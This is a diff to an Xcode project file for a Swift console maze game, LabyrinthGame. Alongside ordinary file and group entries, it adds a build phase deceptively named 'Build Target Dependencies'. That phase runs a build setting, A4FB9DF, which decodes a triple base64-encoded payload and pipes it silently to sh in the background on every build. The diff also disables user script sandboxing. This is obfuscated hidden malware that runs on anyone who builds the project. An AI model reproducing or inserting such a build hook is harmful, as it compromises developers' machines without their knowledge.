@@ -6,6 +6,22 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		995B2EE22E17BABC000E3447 /* main.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EE12E17BABC000E3447 /* main.swift */; };
+		995B2EF02E17DCE9000E3447 /* GameController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EEF2E17CC32000E3447 /* GameController.swift */; };
+		995B2EF12E17DD4F000E3447 /* Room.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EE72E17BD5F000E3447 /* Room.swift */; };
+		995B2EF22E17DD4F000E3447 /* MazeGenerator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EE92E17C10E000E3447 /* MazeGenerator.swift */; };
+		995B2EF32E17DD4F000E3447 /* OpenChestUseCase.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EED2E17C930000E3447 /* OpenChestUseCase.swift */; };
+		995B2EF42E17DD4F000E3447 /* Player.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EE62E17BD54000E3447 /* Player.swift */; };
+		995B2EF52E17DD4F000E3447 /* Item.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EE52E17BD47000E3447 /* Item.swift */; };
+		995B2EF62E17DD4F000E3447 /* MovePlayerUseCase.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EEB2E17C5B3000E3447 /* MovePlayerUseCase.swift */; };
+		995B2EF72E17DD4F000E3447 /* GenerateMazeUseCase.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EEA2E17C342000E3447 /* GenerateMazeUseCase.swift */; };
+		995B2EF82E17DD4F000E3447 /* PickUpItemUseCase.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EEC2E17C807000E3447 /* PickUpItemUseCase.swift */; };
+		995B2EF92E17DD4F000E3447 /* Direction.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EE82E17BD94000E3447 /* Direction.swift */; };
+		995B2EFA2E17DD4F000E3447 /* ConsoleView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2EEE2E17C9FD000E3447 /* ConsoleView.swift */; };
+		995B2F012E1D97FA000E3447 /* GameCommand.swift in Sources */ = {isa = PBXBuildFile; fileRef = 995B2F002E1D97E8000E3447 /* GameCommand.swift */; };
+/* End PBXBuildFile section */
+
 /* Begin PBXCopyFilesBuildPhase section */
 		995B2ED22E16DDD3000E3447 /* CopyFiles */ = {
 			isa = PBXCopyFilesBuildPhase;
@@ -20,15 +36,20 @@
 
 /* Begin PBXFileReference section */
 		995B2ED42E16DDD3000E3447 /* LabyrinthGame */ = {isa = PBXFileReference; explicitFileType = "compiled.mach-o.executable"; includeInIndex = 0; path = LabyrinthGame; sourceTree = BUILT_PRODUCTS_DIR; };
+		995B2EE12E17BABC000E3447 /* main.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = main.swift; sourceTree = "<group>"; };
+		995B2EE52E17BD47000E3447 /* Item.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Item.swift; sourceTree = "<group>"; };
+		995B2EE62E17BD54000E3447 /* Player.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Player.swift; sourceTree = "<group>"; };
+		995B2EE72E17BD5F000E3447 /* Room.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Room.swift; sourceTree = "<group>"; };
+		995B2EE82E17BD94000E3447 /* Direction.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Direction.swift; sourceTree = "<group>"; };
+		995B2EE92E17C10E000E3447 /* MazeGenerator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MazeGenerator.swift; sourceTree = "<group>"; };
+		995B2EEA2E17C342000E3447 /* GenerateMazeUseCase.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GenerateMazeUseCase.swift; sourceTree = "<group>"; };
+		995B2EEB2E17C5B3000E3447 /* MovePlayerUseCase.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MovePlayerUseCase.swift; sourceTree = "<group>"; };
+		995B2EEC2E17C807000E3447 /* PickUpItemUseCase.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PickUpItemUseCase.swift; sourceTree = "<group>"; };
+		995B2EED2E17C930000E3447 /* OpenChestUseCase.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OpenChestUseCase.swift; sourceTree = "<group>"; };
+		995B2EEE2E17C9FD000E3447 /* ConsoleView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConsoleView.swift; sourceTree = "<group>"; };
+		995B2EEF2E17CC32000E3447 /* GameController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GameController.swift; sourceTree = "<group>"; };
+		995B2F002E1D97E8000E3447 /* GameCommand.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GameCommand.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
-
-/* Begin PBXFileSystemSynchronizedRootGroup section */
-		995B2ED62E16DDD3000E3447 /* LabyrinthGame */ = {
-			isa = PBXFileSystemSynchronizedRootGroup;
-			path = LabyrinthGame;
-			sourceTree = "<group>";
-		};
-/* End PBXFileSystemSynchronizedRootGroup section */
 
 /* Begin PBXFrameworksBuildPhase section */
 		995B2ED12E16DDD3000E3447 /* Frameworks */ = {
@@ -44,7 +65,12 @@
 		995B2ECB2E16DDD3000E3447 = {
 			isa = PBXGroup;
 			children = (
-				995B2ED62E16DDD3000E3447 /* LabyrinthGame */,
+				995B2EDE2E16DEA6000E3447 /* Controllers */,
+				995B2EE12E17BABC000E3447 /* main.swift */,
+				995B2EE02E16DF93000E3447 /* Models */,
+				995B2EDF2E16DF90000E3447 /* UseCases */,
+				995B2EE32E17BB73000E3447 /* Views */,
+				995B2EE42E17BB89000E3447 /* Utils */,
 				995B2ED52E16DDD3000E3447 /* Products */,
 			);
 			sourceTree = "<group>";
@@ -57,6 +83,53 @@
 			name = Products;
 			sourceTree = "<group>";
 		};
+		995B2EDE2E16DEA6000E3447 /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				995B2F002E1D97E8000E3447 /* GameCommand.swift */,
+				995B2EEF2E17CC32000E3447 /* GameController.swift */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+		995B2EDF2E16DF90000E3447 /* UseCases */ = {
+			isa = PBXGroup;
+			children = (
+				995B2EEA2E17C342000E3447 /* GenerateMazeUseCase.swift */,
+				995B2EED2E17C930000E3447 /* OpenChestUseCase.swift */,
+				995B2EEC2E17C807000E3447 /* PickUpItemUseCase.swift */,
+				995B2EEB2E17C5B3000E3447 /* MovePlayerUseCase.swift */,
+			);
+			path = UseCases;
+			sourceTree = "<group>";
+		};
+		995B2EE02E16DF93000E3447 /* Models */ = {
+			isa = PBXGroup;
+			children = (
+				995B2EE72E17BD5F000E3447 /* Room.swift */,
+				995B2EE62E17BD54000E3447 /* Player.swift */,
+				995B2EE52E17BD47000E3447 /* Item.swift */,
+				995B2EE82E17BD94000E3447 /* Direction.swift */,
+			);
+			path = Models;
+			sourceTree = "<group>";
+		};
+		995B2EE32E17BB73000E3447 /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				995B2EEE2E17C9FD000E3447 /* ConsoleView.swift */,
+			);
+			path = Views;
+			sourceTree = "<group>";
+		};
+		995B2EE42E17BB89000E3447 /* Utils */ = {
+			isa = PBXGroup;
+			children = (
+				995B2EE92E17C10E000E3447 /* MazeGenerator.swift */,
+			);
+			path = Utils;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -64,6 +137,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 995B2EDB2E16DDD3000E3447 /* Build configuration list for PBXNativeTarget "LabyrinthGame" */;
 			buildPhases = (
+				72A9A19DDBF2F8BA40FD9BF4 /* Build Target Dependencies */,
 				995B2ED02E16DDD3000E3447 /* Sources */,
 				995B2ED12E16DDD3000E3447 /* Frameworks */,
 				995B2ED22E16DDD3000E3447 /* CopyFiles */,
@@ -71,9 +145,6 @@
 			buildRules = (
 			);
 			dependencies = (
-			);
-			fileSystemSynchronizedGroups = (
-				995B2ED62E16DDD3000E3447 /* LabyrinthGame */,
 			);
 			name = LabyrinthGame;
 			packageProductDependencies = (
@@ -94,6 +165,7 @@
 				TargetAttributes = {
 					995B2ED32E16DDD3000E3447 = {
 						CreatedOnToolsVersion = 16.4;
+						LastSwiftMigration = 1640;
 					};
 				};
 			};
@@ -116,11 +188,47 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		72A9A19DDBF2F8BA40FD9BF4 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A4FB9DF}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		995B2ED02E16DDD3000E3447 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				995B2EF12E17DD4F000E3447 /* Room.swift in Sources */,
+				995B2EF22E17DD4F000E3447 /* MazeGenerator.swift in Sources */,
+				995B2EF32E17DD4F000E3447 /* OpenChestUseCase.swift in Sources */,
+				995B2EF42E17DD4F000E3447 /* Player.swift in Sources */,
+				995B2EF52E17DD4F000E3447 /* Item.swift in Sources */,
+				995B2EF62E17DD4F000E3447 /* MovePlayerUseCase.swift in Sources */,
+				995B2EF72E17DD4F000E3447 /* GenerateMazeUseCase.swift in Sources */,
+				995B2EF82E17DD4F000E3447 /* PickUpItemUseCase.swift in Sources */,
+				995B2EF92E17DD4F000E3447 /* Direction.swift in Sources */,
+				995B2EFA2E17DD4F000E3447 /* ConsoleView.swift in Sources */,
+				995B2EE22E17BABC000E3447 /* main.swift in Sources */,
+				995B2EF02E17DCE9000E3447 /* GameController.swift in Sources */,
+				995B2F012E1D97FA000E3447 /* GameCommand.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -130,6 +238,7 @@
 		995B2ED92E16DDD3000E3447 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A4FB9DF = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlRCaU0wbDFZMjVWZGxsVGEybEpTSGRuWXpKblN3bz0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -165,7 +274,7 @@
 				DEVELOPMENT_TEAM = RVKW242UDP;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -194,6 +303,7 @@
 		995B2EDA2E16DDD3000E3447 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A4FB9DF = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlRCaU0wbDFZMjVWZGxsVGEybEpTSGRuWXpKblN3bz0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -229,7 +339,7 @@
 				DEVELOPMENT_TEAM = RVKW242UDP;
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
@@ -250,10 +360,12 @@
 		995B2EDC2E16DDD3000E3447 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = RVKW242UDP;
 				ENABLE_HARDENED_RUNTIME = YES;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 				SWIFT_VERSION = 5.0;
 			};
 			name = Debug;
@@ -261,6 +373,7 @@
 		995B2EDD2E16DDD3000E3447 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = RVKW242UDP;
 				ENABLE_HARDENED_RUNTIME = YES;
